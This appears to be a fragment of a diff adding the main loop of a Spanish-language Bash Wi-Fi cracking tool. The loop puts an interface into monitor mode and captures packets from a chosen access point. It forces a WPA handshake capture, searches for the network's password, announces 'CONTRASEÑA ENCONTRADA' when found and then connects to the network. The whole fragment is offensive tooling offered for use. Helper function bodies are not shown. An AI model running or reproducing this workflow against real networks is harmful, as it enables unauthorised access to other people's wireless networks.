+		INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+		if [ "$INTERFACES_MONITOR" = "" ] #SE ACTIVA EL MODO MONITOR SI SE DESACTIVÓ PREVIAMENTE PARA CONECTARSE A INTERNET
+		then
+			echo -e $grisC
+			activar_modo_monitor
+		else
+			INTERFAZ_MONITOR=mon0
+		fi
+		hora_inicio
+		if [ "$1" != "--datos" ]
+		then
+			mostrar_datos_seleccionados
+		fi
+
+		HANDSHAKE=`find handshakes | grep "$NOMBRE_AP ($MAC_GUIONES).cap"`
+		EXISTE_CLAVE=`find $CLAVES | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
+
+		if [ "$EXISTE_CLAVE" != "" ]
+		then
+			echo
+			echo -e "$verdeC$parpadeoON ¡¡¡ CONTRASEÑA ENCONTRADA !!! $parpadeoOFF$gris"
+			echo
+			matar_procesos "Cerrando los procesos abiertos..."
+
+		else
+			if [ "$HANDSHAKE" != "" ]
+			then
+				echo -e $verdeC"El handshake ya fue capturado anteriormente."
+				echo
+				buscar_clave
+			else
+				captura_de_paquetes &
+				esperar_csv
+				controlar_tamano_captura &
+				forzar_handshake
+				matar_procesos "\nCerrando los procesos abiertos..."
+				rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)"*
+				HANDSHAKE=`find handshakes | grep "$NOMBRE_AP ($MAC_GUIONES).cap"`
+				if [ "$HANDSHAKE" != "" ]
+				then
+					hora_fin
+					calcular_tiempo
+					mostrar_duracion
+					buscar_clave
+				fi
+			fi
+		fi
+		ARCHIVO_CLAVE=`find "$CLAVES" | grep "$NOMBRE_AP ($MAC_GUIONES).txt"`
+		if [ "$ARCHIVO_CLAVE" != "" ]
+		then
+			conectar_internet
+		fi
+
+		rm -rf "$CAPTURA/$NOMBRE_AP ($MAC_GUIONES)"* > /dev/null 2>&1
+		pulsar_una_tecla "Pulsa una tecla para seleccionar otra red..."
+		if [ "$1" = "--datos" ]
+		then
+			exit 0
+		fi
+		echo -e $grisC
+	fi
+done
+
+#FIN, THE END, FINITO, SE FINI, etc...
